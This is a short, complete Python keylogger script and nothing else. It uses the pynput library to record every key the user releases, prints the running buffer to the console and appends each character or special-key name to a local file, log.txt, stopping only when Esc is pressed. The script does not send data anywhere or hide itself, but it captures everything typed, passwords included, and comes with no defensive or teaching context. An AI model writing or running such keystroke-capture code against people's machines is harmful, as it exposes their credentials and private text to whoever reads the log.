from pynput.keyboard import Listener, Key
from collections import deque

keys = deque(maxlen=1000)

def log(text):
    with open("log.txt", "a") as file_log:
        file_log.write(text)


def monitor(key):
        keys.append(key)
        print(keys)
        try:
            log(key.char)
        except AttributeError:
            log(" <" + str(key) + "> ")
        if key == Key.esc:
            return False

with Listener (on_release=monitor) as listener:
        listener.join()
    

